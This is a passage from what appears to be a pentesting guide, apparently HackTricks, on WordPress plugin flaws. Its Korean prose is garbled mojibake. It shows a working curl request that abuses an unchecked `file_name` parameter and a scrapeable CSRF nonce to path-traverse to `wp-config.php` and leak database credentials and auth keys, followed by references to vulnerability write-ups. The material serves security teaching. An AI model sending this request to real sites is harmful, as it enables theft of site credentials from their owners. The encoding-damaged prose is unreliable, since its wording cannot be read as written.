`$file_name`ì€ ê³µê²©ìê°€ ì œì–´í•˜ë©° **ê²€ì¦ ì—†ì´** ì´ì–´ë¶™ì—¬ì§‘ë‹ˆë‹¤. ë‹¤ì‹œ ë§í•´, ìœ ì¼í•œ ì¥ë²½ì€ ì´ë ¥ì„œ í˜ì´ì§€ì—ì„œ ê°€ì ¸ì˜¬ ìˆ˜ ìˆëŠ” **CSRF nonce**ì…ë‹ˆë‹¤.

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
ì„œë²„ê°€ `wp-config.php`ì˜ ë‚´ìš©ì„ ë°˜í™˜í•˜ì—¬ leaking DB credentials and auth keys.

## ì°¸ì¡°

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset â€“ delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments â‰¤ 5.6.1 â€“ Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)

{{#include ../../banners/hacktricks-training.md}}
